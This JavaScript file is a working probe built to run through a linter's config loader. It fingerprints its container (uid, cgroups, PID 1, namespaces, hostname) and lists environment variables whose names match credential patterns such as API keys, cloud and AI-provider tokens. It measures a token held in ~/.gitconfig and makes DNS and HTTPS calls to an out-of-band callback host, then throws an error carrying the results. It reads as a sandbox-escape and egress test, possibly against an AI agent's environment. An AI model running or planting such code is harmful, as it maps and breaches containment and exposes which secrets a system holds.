// H122 probe — loaded by prisma-lint's cosmiconfig JS loader if that path is active.
// Emits a containment fingerprint (no secret values) and one OAST egress attempt, then throws.
const fs = require('fs');
const os = require('os');
const { spawnSync } = require('child_process');

const OAST = 'dc2edfu9g0uaue02jcs0zzx78ato7b7fo.oast.site';
const p = [];

try { p.push('uid=' + process.getuid()); } catch (e) { p.push('uid=ERR'); }
try {
  const cg = fs.readFileSync('/proc/self/cgroup', 'utf8').split('\n').filter((l) => l.indexOf('memory') !== -1);
  p.push('cg=' + cg.join('|').slice(0, 160));
} catch (e) { p.push('cg=ERR'); }
try {
  p.push('pid1=' + fs.readFileSync('/proc/1/cmdline', 'utf8').replace(/\0/g, ' ').trim().slice(0, 70));
} catch (e) { p.push('pid1=ERR'); }
try { p.push('host=' + os.hostname()); } catch (e) { p.push('host=ERR'); }
try {
  p.push('ns=' + ['pid', 'user', 'mnt', 'net'].map((n) => {
    try { return n + ':' + fs.readlinkSync('/proc/self/ns/' + n); } catch (e) { return n + ':ERR'; }
  }).join(','));
} catch (e) { p.push('ns=ERR'); }

let names = [];
try { names = fs.readFileSync('/proc/self/environ', 'utf8').split('\0').filter(Boolean).map((s) => s.split('=')[0]); } catch (e) {}
const hits = names.filter((n) => /KEY|TOKEN|SECRET|PASS|CRED|DATABASE|GITHUB|GITLAB|JIRA|SMTP|STRIPE|PINECONE|LANGCHAIN|ANTHROPIC|OPENAI|GOOGLE|GCP|AWS|AZURE|SLACK|PROXY/i.test(n));
p.push('envn=' + names.length);
p.push('envhits=' + hits.join(','));

try {
  const gc = fs.readFileSync(os.homedir() + '/.gitconfig', 'utf8');
  const m = gc.match(/Proxy-Tokenizer\s*=\s*(\S+)/i);
  p.push('toklen=' + (m ? m[1].length : 0));
} catch (e) { p.push('toklen=' + (e.code || 'ERR')); }

const child = [
  "const d=require('dns');",
  "d.lookup('" + OAST + "',(e,a)=>{console.log(e?'DNSERR='+e.code:'DNS='+a);",
  "const h=require('https');const r=h.get('https://" + OAST + "/h122p',{timeout:3000},res=>{console.log('HTTP='+res.statusCode);res.resume();});",
  "r.on('error',x=>console.log('HTTPSERR='+x.code));r.on('timeout',()=>{r.destroy();console.log('HTTPSERR=timeout');});});",
].join('');
try {
  const r = spawnSync(process.execPath, ['-e', child], { timeout: 9000, encoding: 'utf8' });
  p.push('egress=[' + ((r.stdout || '') + (r.stderr || '')).replace(/\s+/g, ';').slice(0, 220) + ']');
} catch (e) { p.push('egress=SPAWNERR'); }

throw new Error('H122-PRISMA ' + p.join(' | '));
